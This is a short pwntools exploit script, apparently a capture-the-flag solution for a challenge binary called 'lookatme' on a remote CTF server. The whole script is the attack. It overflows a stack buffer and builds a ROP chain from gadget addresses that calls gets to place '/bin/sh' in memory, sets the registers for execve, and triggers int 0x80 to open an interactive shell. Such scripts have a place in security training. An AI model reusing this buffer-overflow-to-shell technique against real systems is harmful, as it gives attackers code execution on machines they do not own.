from pwn import *

r=remote("ctf.j0n9hyun.xyz",3017)
#r=process("./lookatme")
b=ELF("./lookatme")

bss=0x80eaf80+0x1000
int80=0x806cc25
peax=0x80b81c6
pebx=0x080583bf
pecx=0x80de955
pedx=0x0806f02a

pay=""
pay+='x'*28
pay+=p32(b.symbols['gets'])
pay+=p32(pebx)
pay+=p32(bss)
pay+=p32(pecx)
pay+=p32(0)
pay+=p32(pedx)
pay+=p32(0)
pay+=p32(peax)
pay+=p32(11)
pay+=p32(int80)


r.sendline(pay)
r.sendline("/bin/sh")
r.interactive()
